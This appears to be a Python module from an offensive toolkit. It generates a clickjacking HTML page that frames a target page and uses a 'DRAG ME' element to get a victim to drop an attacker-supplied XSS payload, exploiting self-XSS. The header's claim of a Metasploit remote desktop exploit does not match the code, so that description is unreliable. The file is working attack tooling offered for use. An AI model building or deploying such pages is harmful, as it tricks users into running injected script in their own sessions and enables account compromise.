'''
Module for Remote Desktop Exploit With Metasploit Framework
Created by ~xGans
Facebook : https://web.facebook.com/ichsan.AndroSec
Gmail : Exsandrrt01@gmail.com
you can report bug on my email
'''
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from core import log
from time import sleep
import subprocess
def clickjacking(xss, iframe):
    log.logger.attack("Processing")
    sleep(1)
    fo=open('output/ClickJacking.html','w')
    source_code="""<html><body>
    <h1>Clickjack to exploit self xss BY: ~xGans(XioChi) </h1>
    <div draggable="true" ondragstart="event.dataTransfer.setData('text/plain', '%s')"><h3>DRAG ME!!</h3></div>
    """%(xss)
    fo.write(source_code)
    fo=open('output/ClickJacking.html','a')
    fo.write(iframe)
    fo.write('</body></html>')
    fo.close()
    log.logger.attacksukses("Sukses Create ClickJacking")
    asdas = subprocess.check_output('echo [ ${PWD}/output/ClickJacking.html ]', shell=True)
    log.logger.single("Done", "   "+asdas)
